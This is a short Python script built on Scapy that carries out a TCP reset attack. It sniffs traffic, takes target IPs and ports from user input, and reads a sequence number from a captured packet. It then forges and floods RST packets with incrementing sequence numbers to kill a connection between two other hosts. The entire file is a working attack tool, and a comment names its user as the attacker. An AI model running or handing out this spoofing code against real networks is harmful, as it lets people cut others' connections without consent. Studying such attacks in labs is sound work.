__author__ = 'Samer Hanna'

from scapy.all import *

#used to fix some configuration
conf.use_pcap = True

#this function exctracts the sequence number from a packet
def findSeqNum(pkt):
	global seq_num
	seq_num = pkt[TCP].ack

rescan = True
while rescan:
	#Sniffing network: attacker is sniffing 25 packets
	capture = sniff(count=25)

	#output some information about the sniffed packets
	capture.summary()

	#Asking user if he wants to resniff network
	while True:
		resniff = input("Continue(c) or Rescan(r): ")
		if resniff=="c":
			rescan = False
			break
		elif resniff=="r":
			break

#Setting the values that will be used in the spoofed packet
ip_src = input("[*] Enter source ip: ")
ip_dst = input("[*] Enter destination ip: ")
port_src = int(input("[*] Enter source port: "))
port_dst = int(input("[*] Enter destination port: "))

#Sniffing a packet sent from dst to src, in order to get seq_num from the packet's ack

#setting a filter for packets to be sniffed
cap_filter = "dst host " + ip_src + " and dst port " + str(port_src)

#sniffing only one packet that meets the condition of the filter,
    #and passing this packet to the function findSeqNum 
pkt = sniff(filter=cap_filter, count=1, prn=findSeqNum)

#Crafting and sending the reset packet
print("[+] Sending the spoofed tcp packet with sequence number = ", seq_num)
IP_layer = IP(src=ip_src, dst=ip_dst)
TCP_layer = TCP(sport=port_src, dport=port_dst, flags="R", seq=seq_num)
pkt = IP_layer/TCP_layer
ls(pkt)
send(pkt)

#Sending more packets with higher sequence number in case we were too late,
#i.e., in case the sequence number we have, or a higher one, got used. 
print("[+] Sending more packets with higher sequence numbers...")
for i in range(0,1000,10):
	TCP_layer = TCP(sport=port_src, dport=port_dst, flags="R", seq=seq_num+i)
	pkt = IP_layer/TCP_layer
	send(pkt, verbose=0)

